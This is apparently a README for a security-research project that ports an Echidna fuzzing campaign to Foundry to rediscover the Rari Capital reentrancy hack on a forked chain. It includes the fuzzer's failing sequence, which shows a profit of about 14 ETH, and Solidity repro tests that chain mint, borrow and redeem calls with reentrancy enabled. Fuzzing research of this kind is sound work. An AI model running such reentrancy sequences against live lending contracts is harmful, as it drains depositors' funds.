## foundry-rari-hack

<https://github.com/rappie/echidna-rari-hack> ported to Foundry

Using a single test account (compared to 3 in original repo), account realizing a profit of 14.042565409259645499 ETH.

```
export ETH_RPC_URL="ETH_RPC_URL"
forge test --mt invariant_test_profit --show-progress

Failing tests:
Encountered 1 failing test in test/RariTest.sol:RariTest
[FAIL. Reason: revert: Account1 profit!]
        [Sequence]
                sender=0x000000000000000000000000000bE84d606FcFEb addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=mint(uint256) args=[34480686646904748734687845775862632361229606401142 [3.448e49]]
                sender=0x24Db7996672835FDCAF432C2b5AB2747FDDB1188 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[146819705882536770626717166753626284388 [1.468e38]]
                sender=0x0000000000000000000000000000000000001FC6 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[12060 [1.206e4]]
                sender=0x000000000000000000000000000000000000145d addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[4183609847315272917562030534181 [4.183e30]]
                sender=0x0000000000000000000000000000000000000507 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[122731788134496338 [1.227e17]]
                sender=0x98F4aF0415472981fFB8bd6B060f9137618A5EB4 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[21265 [2.126e4]]
                sender=0x00000000000000000000000000024975E270Ee27 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[9343]
                sender=0x00000000000000000000000000000000371Fd8E5 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[54614006384459053945509674884461949487903176697932797427761530591 [5.461e64]]
                sender=0x0000000000000000000000000000000000000Fe5 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[2212145813418856138753290481425584633259254370 [2.212e45]]
                sender=0x0000000000000000000000000002673d67aE27E3 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=borrow(uint256) args=[4760753135904324988326715789554485535 [4.76e36]]
                sender=0x0000000000000000000000000000000000000507 addr=[test/RariTest.sol:RariFuzzHandler]0x2e234DAe75C793f67A35089C9d99245E1C58470b calldata=redeem(uint256) args=[447649540520714 [4.476e14]]
 ```

Repro unit tests: `forge test --mt testRariRepro`

```Solidity
    function testRariReproEchidna() public {
        handler.setReentrancyEnabled(true);
        handler.mint(
            10089325332519370949262917519849428342404732088146691233195543578618300570336
        );
        handler.setReentrancyCallback(4);
        handler.borrow(1164710473815707741);
        handler.redeem(995200615491);
        checkInvariant();
    }

    function testRariReproFoundry() public {
        handler.setReentrancyEnabled(true);
        handler.mint(34480686646904748734687845775862632361229606401142);
        handler.redeem(146819705882536770626717166753626284388);
        handler.redeem(12060);
        handler.redeem(4183609847315272917562030534181);
        handler.redeem(122731788134496338);
        handler.redeem(21265);
        handler.redeem(9343);
        handler.redeem(
            54614006384459053945509674884461949487903176697932797427761530591
        );
        handler.redeem(2212145813418856138753290481425584633259254370);
        handler.setReentrancyCallback(4);
        handler.borrow(4760753135904324988326715789554485535);
        handler.redeem(447649540520714);
        checkInvariant();
    }

    function testRariReproFoundry1() public {
        handler.setReentrancyEnabled(true);
        handler.mint(45778455268918263640951207098);
        handler.redeem(2239);
        handler.mint(908257824107570795476750864031);
        handler.mint(6605);
        handler.redeem(
            31661082072479443877711301545670601430554519912440964396920010859656321
        );
        handler.setReentrancyCallback(4);
        handler.borrow(104558218978698757946920526751204333464303325974512028);
        handler.redeem(1564938114064896760);
        checkInvariant();
    }
```
